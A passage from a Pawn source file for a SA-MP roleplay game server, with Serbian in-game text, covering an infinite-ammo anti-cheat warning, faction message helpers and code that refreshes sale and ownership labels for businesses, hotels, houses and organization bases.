			        antiCheatCS[ playerid ][ LastAmmo ] = 0;
			        
					format( globalstring, sizeof( globalstring ), "| V:AC | Moguc infinite ammo hack || %s[ID: %d] | Koristi /spec!!!", ImeIgraca( playerid ), playerid );
		        	AdminPoruka( ANTICHEAT, globalstring );
				}
			}
        }
    }
    antiCheatCS[ playerid ][ LastAmmo ] = GetPlayerAmmo( playerid );
	//
	antiCheatCS[ playerid ][ LastWShot ] = tickcount( );

	if( GetPlayerAmmo( playerid ) <= 1 ) {
		antiCheatCS[ playerid ][ WeaponDetect ] = 3;

		antiCheatCS[ playerid ][ Weapon ][ g_aWeaponSlots[ weaponid ] ] = 0;
		antiCheatCS[ playerid ][ Ammo ][ g_aWeaponSlots[ weaponid ] ] = 0;
	}

	//printf( "Weapon %i fired. hittype: %i   hitid: %i   pos: %f, %f, %f", weaponid, hittype, hitid, fX, fY, fZ);
	return 1;
}

//------------------------------------------------------------------------------
// stock KodSprunk( playerid ) {
//         if( IsPlayerInRangeOfPoint( playerid, 4, -2420.219, 984.578, 44.297 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -2420.180, 985.945, 44.297 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2225.203, -1153.422, 1025.906 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2576.703, -1284.430, 1061.094 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2155.906, 1606.773, 1000.055 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2209.906, 1607.195, 1000.055 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2222.203, 1606.773, 1000.055 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 495.969, -24.320, 1000.734 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 501.828, -1.430, 1000.734 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 373.828, -178.141, 1000.734 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 330.680, 178.500, 1020.070 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 331.922, 178.500, 1020.070 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 350.906, 206.086, 1008.477 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 361.563, 158.617, 1008.477 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 371.594, 178.453, 1020.070 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 374.891, 188.977, 1008.477 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2155.844, 1607.875, 1000.063 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2202.453, 1617.008, 1000.063 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2209.242, 1621.211, 1000.063 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2222.367, 1602.641, 1000.063 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 500.563, -1.367, 1000.734 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 379.039, -178.883, 1000.734 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2480.86,-1959.27,12.9609 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 1634.11,-2237.53,12.8906 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2139.52,-1161.48,23.3594 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2153.23,-1016.15,62.2344 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -1350.12,493.859,10.5859 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -2229.19,286.414,34.7031 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 1659.46,1722.86,10.2188 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2647.7,1129.66,10.2188 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2845.73,1295.05,10.7891 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 1398.84,2222.61,10.4219 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -1455.12,2591.66,55.2344 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -76.0312,1227.99,19.125 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 662.43,-552.164,15.7109 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -253.742,2599.76,62.2422 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2271.73,-76.4609,25.9609 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 1789.21,-1369.27,15.1641 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 1729.79,-1943.05,12.9453 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2060.12,-1897.64,12.9297 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 1928.73,-1772.45,12.9453 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2325.98,-1645.13,14.2109 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2352.18,-1357.16,23.7734 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 1154.73,-1460.89,15.1562 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -1350.12,492.289,10.5859 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -2118.97,-423.648,34.7266 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -2118.62,-422.414,34.7266 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -2097.27,-398.336,34.7266 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -2092.09,-490.055,34.7266 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -2063.27,-490.055,34.7266 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -2005.65,-490.055,34.7266 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -2034.46,-490.055,34.7266 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -2068.56,-398.336,34.7266 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -2039.85,-398.336,34.7266 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -2011.14,-398.336,34.7266 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -1980.79,142.664,27.0703 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2319.99,2532.85,10.2188 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 1520.15,1055.27,10.00 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2503.14,1243.7,10.2188 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 2085.77,2071.36,10.4531 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -862.828,1536.61,21.9844 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -14.7031,1175.36,18.9531 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, -253.742,2597.95,62.2422 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 201.016,-107.617,0.898438 ) ) return 1;
//         else if( IsPlayerInRangeOfPoint( playerid, 4, 1277.84,372.516,18.9531 ) ) return 1;
//         else return 0;
// }
//------------------------------------------------------------------------------
stock strreplace(string[], find, replace) {
    for( new i=0; string[ i ]; i++) {
        if(string[ i ] == find) {
            string[ i ] = replace; } }
}
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
stock OrgPoruka(orgid, boja, string[]) 	{
	foreach( Player, i ) {
	    if( PlayerInfo[ i ][ xClan ] == orgid || PlayerInfo[ i ][ xLider ] == orgid || listenFamily[i]) 	{
	        if(GetPVarInt( i, "ToggedFR") == 0) {
	        	SCM( i, boja, string ); } } }
	return true;
}
stock OrgPorukaLeader( orgid, boja, string[] ) 	{
	foreach( Player, i ) {
	    if( PlayerInfo[ i ][ xLider ] == orgid ) 	{
			SCM(  i, boja, string );
		}
	}
	return true;
}
stock OrgPorukaMD(orgid, boja, string[]) 	{
	foreach( Player, i ) {
	    if( PlayerInfo[ i ][ xClan ] == orgid || PlayerInfo[ i ][ xLider ] == orgid ) 	{
	        if(GetPVarInt( i, "ToggedFR") == 0) {
	            if( MedicDuty[ i ] == true ) {
	        		SCM( i, boja, string ); } } } }
	return true;
}
//------------------------------------------------------------------------------
stock OrgPoruka1(orgid, boja, string[]) 	{
	foreach( Player, i ) {
	    if( PlayerInfo[ i ][ xClan ] == orgid || PlayerInfo[ i ][ xLider ] == orgid ) 	{
	        if(GetPVarInt( i, "ToggedDC") == 0) {
	        	SCM( i, boja, string ); } } }
	return true;
}
//------------------------------------------------------------------------------
GetNearestOrganization( playerid ) {
    for( new b = 1; b < MAX_ORG; b++) {
        if( IsPlayerInRangeOfPoint( playerid, 2.0, OI[ b ][ oPozExtX], OI[ b ][ oPozExtY], OI[ b ][ oPozExtZ ] ) ) return b; }
    return -1;
}

GetNearestWeakPoint(playerid) {

    for( new b = 1; b < MAX_ORG; b++) {
        if( IsPlayerInRangeOfPoint( playerid, 2.0, OI[ b ][ oSlabaTacka][0], OI[ b ][ oSlabaTacka][1], OI[ b ][ oSlabaTacka ][2] ) ) return b; }
    return -1;
}
//------------------------------------------------------------------------------
stock Bussines_Refresh( b ) {
	new String: string;

	if( IsValidDynamicPickup( FirmaPickup[ b ] ) )
		DestroyDynamicPickup( FirmaPickup[ b ] );

	if( IsValidDynamic3DTextLabel( FirmaLabel[ b ] ) )
		DestroyDynamic3DTextLabel( FirmaLabel[ b ] );

	if( BussinesInfo[ b ][ bOwned ] == 0) {

        if(BussinesInfo[b][bType] == VRSTA_PRAZANLOKAL) {

            string = str_format("{00DCF5}Lokal na prodaju"col_white"[ID %d]{00DCF5}\n{00DCF5}Adresa Lokala: "col_white"%s\n{00DCF5}Za kupovinu upisite\n/kupilokal", b, UliceFirme( b ) );
            // format( string, sizeof( string), "{00DCF5}Lokal na prodaju"col_white"[ID %d]{00DCF5}\n{00DCF5}Adresa Lokala: "col_white"%s\n{00DCF5}Za kupovinu upisite\n/kupilokal", b, UliceFirme( b ) );
            FirmaPickup[ b ] = CreateDynamicPickup( 1210, 1, BussinesInfo[ b ][ bEnterX ], BussinesInfo[ b ][ bEnterY ], BussinesInfo[ b ][ bEnterZ ] );
        }
        if(BussinesInfo[b][bType] == VRSTA_POSAO) {

            new firmaIme[32], IDFirme = b;
            format(firmaIme, 32, "%s", getJobName(BussinesInfo[ IDFirme ][ bJobID ]));
            string = str_format("{00DCF5}Poslovna Firma na prodaju"col_white"[ID %d]{00DCF5}\nPosao : "col_white"%s\n{00DCF5}Cena Firme : "col_white"%d$\n{00DCF5}Vrsta Firme : "col_white"%s\n{00DCF5}Potreban level: "col_white"%d\n{00DCF5}Za kupovinu upisite\n/kupifirmu", IDFirme, firmaIme, BussinesInfo[ IDFirme ][ bPrice ], getBussinesType( IDFirme ), BussinesInfo[ IDFirme ][ bLevel ]);
        }
        else {

            string = str_format("{00DCF5}Firma na prodaju"col_white"[ID %d]{00DCF5}\n{00DCF5}Ime : "col_white"%s\n{00DCF5}Cena Firme : "col_white"%d$\n{00DCF5}Vrsta Firme : "col_white"%s\n{00DCF5}Potreban level: "col_white"%d\n{00DCF5}Adresa Firme: "col_white"%s\n{00DCF5}Za kupovinu upisite\n/kupifirmu", b, BussinesInfo[ b ][ bName ], BussinesInfo[ b ][ bPrice ], getBussinesType( b ), BussinesInfo[ b ][ bLevel ], UliceFirme( b ) );
            // format( string, sizeof( string), "{00DCF5}Firma na prodaju"col_white"[ID %d]{00DCF5}\n{00DCF5}Ime : "col_white"%s\n{00DCF5}Cena Firme : "col_white"%d$\n{00DCF5}Vrsta Firme : "col_white"%s\n{00DCF5}Potreban level: "col_white"%d\n{00DCF5}Adresa Firme: "col_white"%s\n{00DCF5}Za kupovinu upisite\n/kupifirmu", b, BussinesInfo[ b ][ bName ], BussinesInfo[ b ][ bPrice ], getBussinesType( b ), BussinesInfo[ b ][ bLevel ], UliceFirme( b ) );
            FirmaPickup[ b ] = CreateDynamicPickup( 1210, 1, BussinesInfo[ b ][ bEnterX ], BussinesInfo[ b ][ bEnterY ], BussinesInfo[ b ][ bEnterZ ] );
        }
	}
	else if( BussinesInfo[ b ][ bOwned ] == 1) {

        if(BussinesInfo[b][bType] == VRSTA_PRAZANLOKAL) {

            string = str_format(""col_white"[ID %d]{00DCF5}Ime : "col_white"%s\n{00DCF5}Vlasnik Firme : "col_white"%s\n{00DCF5}Vrsta Firme : "col_white"Prazan Lokal\n{00DCF5}Adresa Firme : "col_white"%s\n{00DCF5}Neaktivnost: "col_white"%dh", b, BussinesInfo[ b ][ bName ],  BussinesInfo[ b ][ bOwner ], UliceFirme( b ), BussinesInfo[ b ][ bNeaktivnost ] );
            // format(string,sizeof(string), ""col_white"[ID %d]{00DCF5}Ime : "col_white"%s\n{00DCF5}Vlasnik Firme : "col_white"%s\n{00DCF5}Vrsta Firme : "col_white"Prazan Lokal\n{00DCF5}Adresa Firme : "col_white"%s\n{00DCF5}Neaktivnost: "col_white"%dh", b, BussinesInfo[ b ][ bName ],  BussinesInfo[ b ][ bOwner ], UliceFirme( b ), BussinesInfo[ b ][ bNeaktivnost ] );
            FirmaPickup[ b ] = CreateDynamicPickup( 1239, 1, BussinesInfo[ b ][ bEnterX ], BussinesInfo[ b ][ bEnterY ], BussinesInfo[ b ][ bEnterZ ] );
        }
        if(BussinesInfo[b][bType] == VRSTA_POSAO) {

            new firmaIme[32], IDFirme = b;
            format(firmaIme, 32, "%s", getJobName(BussinesInfo[ IDFirme ][ bJobID ]));
            string = str_format("{00DCF5}Poslovna Firma"col_white"[ID %d]{00DCF5}\nPosao : "col_white"%s\n{00DCF5}Vlasnik : "col_white"%s\n{00DCF5}Vrsta Firme : "col_white"%s\n{00DCF5}Potreban level: "col_white"%d\n{00DCF5}Adresa Firme: "col_white"%s", IDFirme, firmaIme, BussinesInfo[ b ][ bOwner ], getBussinesType( IDFirme ), BussinesInfo[ IDFirme ][ bLevel ], UliceFirme( IDFirme ) );
        }
        else {

            string = str_format(""col_white"[ID %d]{00DCF5}Ime : "col_white"%s\n{00DCF5}Vlasnik Firme : "col_white"%s\n{00DCF5}Vrsta Firme : "col_white"%s\n{00DCF5}Adresa Firme : "col_white"%s\n{00DCF5}Neaktivnost: "col_white"%dh", b, BussinesInfo[ b ][ bName ],  BussinesInfo[ b ][ bOwner ], getBussinesType( b ), UliceFirme( b ), BussinesInfo[ b ][ bNeaktivnost ] );
            // format(string,sizeof(string), ""col_white"[ID %d]{00DCF5}Ime : "col_white"%s\n{00DCF5}Vlasnik Firme : "col_white"%s\n{00DCF5}Vrsta Firme : "col_white"%s\n{00DCF5}Adresa Firme : "col_white"%s\n{00DCF5}Neaktivnost: "col_white"%dh", b, BussinesInfo[ b ][ bName ],  BussinesInfo[ b ][ bOwner ], getBussinesType( b ), UliceFirme( b ), BussinesInfo[ b ][ bNeaktivnost ] );
            FirmaPickup[ b ] = CreateDynamicPickup( 1239, 1, BussinesInfo[ b ][ bEnterX ], BussinesInfo[ b ][ bEnterY ], BussinesInfo[ b ][ bEnterZ ] );
        }
	}

	FirmaLabel[ b ] = pp_CreateDynamic3DTextLabel(string, 0x33CCFFAA, BussinesInfo[ b ][ bEnterX ], BussinesInfo[ b ][ bEnterY ], BussinesInfo[ b ][ bEnterZ ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1);
	return true;
}
//------------------------------------------------------------------------------
getTypePName( type ) {
	new typeName[26] = "Nepostojeca vrsta";

	switch( type )
	{
	    case 0: typeName = "Nema";
		case MALA_KUCA: typeName = "Mala kuca";
		case SREDNJA_KUCA: typeName = "Srednja kuca";
		case VELIKA_KUCA: typeName = "Velika kuca";
		case PENTHOUSE_KUCA: typeName = "PentHouse";
	}
	return typeName;
}
//------------------------------------------------------------------------------
stock HotelRefresh( h ) {
	new String: string;
	if( h != -1 ) {
		if( IsValidDynamicPickup( hotelInfo[ h ][ hPickup ] ) )
			DestroyDynamicPickup( hotelInfo[ h ][ hPickup ] );

		if( IsValidDynamic3DTextLabel( hotelInfo[ h ][ h3DText ] ) )
			DestroyDynamic3DTextLabel( hotelInfo[ h ][ h3DText ] );


		if( hotelInfo[ h ][ hOwned ] == 0 ) {
            string = str_format("{36AB00}Hotel na Prodaju"col_white"[ID %d]{36AB00}\n{36AB00}Cena: "col_white"%d$\n{36AB00}Potreban level: "col_white"%d\n{36AB00}Adresa: "col_white"%s\n{36AB00}Za kupovinu "col_white"/kupihotel", h, hotelInfo[ h ][ hPrice ], hotelInfo[ h ][ hLevel ], hotelInfo[ h ][ hAdress ] );
	        // format( string, sizeof( string ), "{36AB00}Hotel na Prodaju"col_white"[ID %d]{36AB00}\n{36AB00}Cena: "col_white"%d$\n{36AB00}Potreban level: "col_white"%d\n{36AB00}Adresa: "col_white"%s\n{36AB00}Za kupovinu "col_white"/kupihotel", h, hotelInfo[ h ][ hPrice ], hotelInfo[ h ][ hLevel ], hotelInfo[ h ][ hAdress ] );
		}
		else if( hotelInfo[ h ][ hOwned ] == 1 ) {
            string = str_format(""col_white"[ID %d]{36AB00}Vlasnik: "col_white"%s\n{36AB00}Adresa: "col_white"%s\n{36AB00}Cena najma: "col_white"%d\n{36AB00}'ENTER' za ulaz u hotel", h, hotelInfo[ h ][ hOwner ], hotelInfo[ h ][ hAdress ], hotelInfo[ h ][ hRoomPrice ] );
			// format( string, sizeof( string ), ""col_white"[ID %d]{36AB00}Vlasnik: "col_white"%s\n{36AB00}Adresa: "col_white"%s\n{36AB00}Cena najma: "col_white"%d\n{36AB00}'ENTER' za ulaz u hotel", h, hotelInfo[ h ][ hOwner ], hotelInfo[ h ][ hAdress ], hotelInfo[ h ][ hRoomPrice ] );
		}
		hotelInfo[ h ][ hPickup ] = CreateDynamicPickup( 19134, 1, hotelInfo[ h ][ hEnter ][ 0 ], hotelInfo[ h ][ hEnter ][ 1 ], hotelInfo[ h ][ hEnter ][ 2 ] );
		hotelInfo[ h ][ h3DText ] = pp_CreateDynamic3DTextLabel( string, 0x33CCFFAA, hotelInfo[ h ][ hEnter ][ 0 ], hotelInfo[ h ][ hEnter ][ 1 ], hotelInfo[ h ][ hEnter ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1);
	}
	return true;
}
//------------------------------------------------------------------------------
stock PropertyRefresh( im ) {

	new string[ 300 ];
	
    if( im != -1 ) {
    
		if( IsValidDynamicPickup( ImovinaPickup[ im ] ) )
			DestroyDynamicPickup( ImovinaPickup[ im ] );

		if( IsValidDynamic3DTextLabel( ImovinaLabel[ im ] ) )
			DestroyDynamic3DTextLabel( ImovinaLabel[ im ] );

		if( II[ im ][ iUsage ] == IMOVINA_KUCA ) {
		
			if( II[ im ][ iOwned ] == 0 ) {
				format( string, sizeof( string ),"{F53D00}Kuca na Prodaju"col_white"[ID %d]{F53D00}\nVrsta: "col_white"%s\n{F53D00}Cena: "col_white"%d$\n{F53D00}Potreban level: "col_white"%d\n{F53D00}Adresa: "col_white"%s\n{F53D00}Za kupovinu "col_white"/kupiimovinu", im, getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
				ImovinaPickup[ im ] = CreateDynamicPickup(1273, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
			}
			else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 0 ) {
				format( string, sizeof( string ),""col_white"[ID %d]{F53D00}Vlasnik: "col_white"%s\n{F53D00}Adresa: "col_white"%s\n{F53D00}Vrsta: "col_white"%s\n{F53D00}Neaktivnost: "col_white"%dh\n{F53D00}'ENTER' za ulaz u imovinu", im, II[ im ][ iOwner ], II[ im ][ iAdress ], getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iNeaktivnost ] );
				ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
			}
			else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 1 ) {
				format( string, sizeof( string ),""col_white"[ID %d]{F53D00}Vlasnik: "col_white"%s\n{F53D00}Adresa: "col_white"%s\n{F53D00}Vrsta: "col_white"%s\n{F53D00}Neaktivnost: "col_white"%dh\n{F53D00}Cena renta: "col_white"%d\n{F53D00}Da rentate sobu kucajte /rentroom", im, II[ im ][ iOwner ], II[ im ][ iAdress ], getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iNeaktivnost ], II[ im ][ iRentPrice ] );
				ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
			}
		}
		else if( II[ im ][ iUsage ] == IMOVINA_STAN ) {
			if( II[ im ][ iOwned ] == 0 ) {
				format( string, sizeof( string ),""col_crvena"Stan na Prodaju"col_white"[ID %d]"col_crvena"\nCena: "col_white"%d$\n"col_crvena"Potreban level: "col_white"%d\n"col_crvena"Adresa: "col_white"%s\n"col_crvena"Za kupovinu "col_white"/kupiimovinu", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
				ImovinaPickup[ im ] = CreateDynamicPickup(1272, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
			}
			else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 0 ) {
				format( string, sizeof( string ),""col_white"[ID %d]"col_crvena"Vlasnik: "col_white"%s\n"col_crvena"Adresa: "col_white"%s\n"col_crvena"Neaktivnost: "col_white"%dh\n"col_crvena"'ENTER' za ulaz u imovinu", im, II[ im ][ iOwner ], II[ im ][ iAdress ], II[ im ][ iNeaktivnost ] );
				ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
			}
			else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 1 ) {
				format( string, sizeof( string ),""col_white"[ID %d]"col_crvena"Vlasnik: "col_white"%s\n"col_crvena"Adresa: "col_white"%s\n"col_crvena"Neaktivnost: "col_white"%dh\n"col_crvena"Cena renta: "col_white"%d\n"col_crvena"Da rentate sobu kucajte /rentroom", im, II[ im ][ iOwner ], II[ im ][ iAdress ], II[ im ][ iNeaktivnost ], II[ im ][ iRentPrice ] );
				ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
			}
		}
		else if( II[ im ][ iUsage ] == IMOVINA_VIKENDICA ) {
		    if( II[ im ][ iOwned ] == 0 ) {
				format( string, sizeof( string ),"{7B8000}Vikendica na Prodaju"col_white"[ID %d]{7B8000}\nCena: "col_white"%d$\n{7B8000}Potreban level: "col_white"%d\n{7B8000}Adresa: "col_white"%s\n{7B8000}Za kupovinu "col_white"/kupiimovinu", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
				ImovinaPickup[ im ] = CreateDynamicPickup(1318, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
		    }
			else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 0 ) {
	            format( string, sizeof( string ),""col_white"[ID %d]{7B8000}Vlasnik: "col_white"%s\n{7B8000}Adresa: "col_white"%s\n{7B8000}Neaktivnost: "col_white"%dh\n'{7B8000}ENTER' za ulaz u imovinu", im, II[ im ][ iOwner ], II[ im ][ iAdress ], II[ im ][ iNeaktivnost ] );
		    	ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
			}
	        else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 1 ) {
	            format( string, sizeof( string ),""col_white"[ID %d]{7B8000}Vlasnik: "col_white"%s\n{7B8000}Adresa: "col_white"%s\n{7B8000}Neaktivnost: "col_white"%dh\n{7B8000}Cena renta: "col_white"%d\n{7B8000}Da rentate sobu kucajte /rentroom", im, II[ im ][ iOwner ], II[ im ][ iAdress ], II[ im ][ iNeaktivnost ], II[ im ][ iRentPrice ] );
		    	ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
			}
		}
		ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, 0x33CCFFAA, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1);
	}
	return true;
}
//------------------------------------------------------------------------------
stock Orge3D( id ) {
	new string[ 256 ];
    DestroyDynamicPickup( OrgPickup[ id ] );
    Delete3DTextLabel( Org3D[ id ] );
    format( string, sizeof( string ),""col_white"%s\n{FF6200}Za ulaz u interijer pritisnite\n"col_white"'ENTER'", OI[ id ][ oName ] );
	Org3D[ id ] = Create3DTextLabel( string, -1, OI[ id ][ oPozExtX ], OI[ id ][ oPozExtY ], OI[ id ][ oPozExtZ ], 25, 0, 1);
	OrgPickup[ id ] = CreateDynamicPickup( 1314, 1, OI[ id ][ oPozExtX ], OI[ id ][ oPozExtY ], OI[ id ][ oPozExtZ ] );
	if( OI[ id ][ oDutyPoint ][ 0 ] != 0 && OI[ id ][ oDutyPoint ][ 1 ] != 0 ) {
	    DestroyDynamicPickup( DutyPointPickup[ id ] );
    	DestroyDynamic3DTextLabel( OrgDuty3D[ id ] );
        OrgDuty3D[ id ] = CreateDynamic3DTextLabel( ""col_white"[ /undercover ]\n"col_crvena"[ /duty ]", -1, OI[ id ][ oDutyPoint ][ 0 ], OI[ id ][ oDutyPoint ][ 1 ], OI[ id ][ oDutyPoint ][ 2 ], 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, OI[ id ][ oDutyVW ], OI[ id ][ oDutyInt ], -1, 20.0);
		DutyPointPickup[ id ] = CreateDynamicPickup( 1239, 1, OI[ id ][ oDutyPoint ][ 0 ], OI[ id ][ oDutyPoint ][ 1 ], OI[ id ][ oDutyPoint ][ 2 ], OI[ id ][ oDutyVW ], OI[ id ][ oDutyInt ], -1, 20.0 );
	}
	if( OI[ id ][ oEquipPoint ][ 0 ] != 0 && OI[ id ][ oEquipPoint ][ 1 ] != 0 ) {
	    DestroyDynamicPickup( EquipPointPickup[ id ] );
    	DestroyDynamic3DTextLabel( OrgEquip3D[ id ] );
        OrgEquip3D[ id ] = CreateDynamic3DTextLabel( ""col_white"Da otvorite meni armorija kucajte\n"col_crvena"[ /pdoprema ]", -1, OI[ id ][ oEquipPoint ][ 0 ], OI[ id ][ oEquipPoint ][ 1 ], OI[ id ][ oEquipPoint ][ 2 ], 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, OI[ id ][ oEquipVW ], OI[ id ][ oEquipInt ], -1, 20.0);
		EquipPointPickup[ id ] = CreateDynamicPickup( 1239, 1, OI[ id ][ oEquipPoint ][ 0 ], OI[ id ][ oEquipPoint ][ 1 ], OI[ id ][ oEquipPoint ][ 2 ], OI[ id ][ oEquipVW ], OI[ id ][ oEquipInt ], -1, 20.0 );
	}
    if( OI[id][oSlabaTacka][0] != 0 && OI[id][oSlabaTacka][1] != 0) {

        if(IsValidDynamicPickup(slabaTackaPickup[id]))
            DestroyDynamicPickup(slabaTackaPickup[id]);
        if(IsValidDynamic3DTextLabel(slabaTackaLabel[id]))
            DestroyDynamic3DTextLabel(slabaTackaLabel[id]);

        slabaTackaLabel[id] = CreateDynamic3DTextLabel( ""col_white"Da provalite u organizaciju kucajte\n"col_crvena"[ /probijslabutacku ]", -1, OI[ id ][ oSlabaTacka ][ 0 ], OI[ id ][ oSlabaTacka ][ 1 ], OI[ id ][ oSlabaTacka ][ 2 ], 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0);
        slabaTackaPickup[ id ] = CreateDynamicPickup( 1239, 1, OI[ id ][ oSlabaTacka ][ 0 ], OI[ id ][ oSlabaTacka ][ 1 ], OI[ id ][ oSlabaTacka ][ 2 ], -1, -1, -1, 20.0 );
    }
	if( OI[ id ][ oDrugField ][ 0 ] != 0 && OI[ id ][ oDrugField ][ 1 ] != 0 ) {
	    DestroyDynamicPickup( OrgFieldPickup[ id ] );
    	DestroyDynamic3DTextLabel( OrgField3d[ id ] );
		new stringfield[ 128 ];
	    format( stringfield, sizeof( stringfield ), ""col_white"Poljana za sadjenje droge\n"col_crvena"%s", OI[ id ][ oName ] );
